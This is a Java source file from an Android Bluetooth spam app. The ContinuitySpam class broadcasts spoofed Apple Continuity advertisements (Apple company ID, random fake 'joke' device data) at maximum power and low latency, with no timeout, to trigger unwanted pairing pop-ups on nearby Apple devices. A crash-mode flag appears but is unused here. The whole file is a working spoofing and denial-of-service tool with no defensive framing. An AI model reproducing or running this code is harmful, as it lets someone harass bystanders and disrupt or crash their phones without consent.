package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;
import android.bluetooth.le.AdvertiseSettings;
import android.bluetooth.le.BluetoothLeAdvertiser;
import android.util.Log;
import java.util.Random;

public class ContinuitySpam extends Spammer {
    private static final String TAG = "ContinuitySpam";
    private ContinuityDevice.type deviceType;
    private boolean isCrash;
    
    public ContinuitySpam(ContinuityDevice.type deviceType, boolean isCrash) {
        this.deviceType = deviceType;
        this.isCrash = isCrash;
    }
    
    @Override
    public void start() {
        isSpamming = true;
        
        try {
            // ИСПОЛЬЗУЕМ ШУТОЧНЫЕ УСТРОЙСТВА ВМЕСТО ФИКСИРОВАННЫХ
            ContinuityDevice jokeDevice = ContinuityDevice.getRandomJokeDevice();
            String deviceName = jokeDevice.getName();
            String hexData = jokeDevice.getValue();
            
            Log.d(TAG, "🚀 Starting: " + deviceName);
            
            // Конвертируем hex в byte array
            byte[] manufacturerData = hexStringToByteArray(hexData);
            
            // Создаем advertise data
            AdvertiseData advertiseData = new AdvertiseData.Builder()
                .setIncludeDeviceName(true)
                .setIncludeTxPowerLevel(true)
                .addManufacturerData(0x004C, manufacturerData) // Apple Company ID
                .build();
                
            // Настройки advertising
            AdvertiseSettings advertiseSettings = new AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(false)
                .setTimeout(0)
                .build();
                
            // Получаем advertiser и запускаем
            BluetoothLeAdvertiser advertiser = Helper.getBluetoothAdapter().getBluetoothLeAdvertiser();
            if (advertiser != null) {
                advertiser.startAdvertising(advertiseSettings, advertiseData, advertiseCallback);
                Log.i(TAG, "✅ Advertising started: " + deviceName);
            } else {
                Log.e(TAG, "❌ BluetoothLeAdvertiser is null");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting continuity spam: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    @Override
    public void stop() {
        isSpamming = false;
        try {
            BluetoothLeAdvertiser advertiser = Helper.getBluetoothAdapter().getBluetoothLeAdvertiser();
            if (advertiser != null) {
                advertiser.stopAdvertising(advertiseCallback);
                Log.i(TAG, "🛑 Advertising stopped");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping continuity spam: " + e.getMessage());
        }
    }
    
    // Вспомогательный метод для конвертации hex строки в byte array
    private byte[] hexStringToByteArray(String s) {
        try {
            int len = s.length();
            byte[] data = new byte[len / 2];
            for (int i = 0; i < len; i += 2) {
                data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                     + Character.digit(s.charAt(i + 1), 16));
            }
            return data;
        } catch (Exception e) {
            Log.e(TAG, "Error converting hex string: " + e.getMessage());
            return new byte[0];
        }
    }
}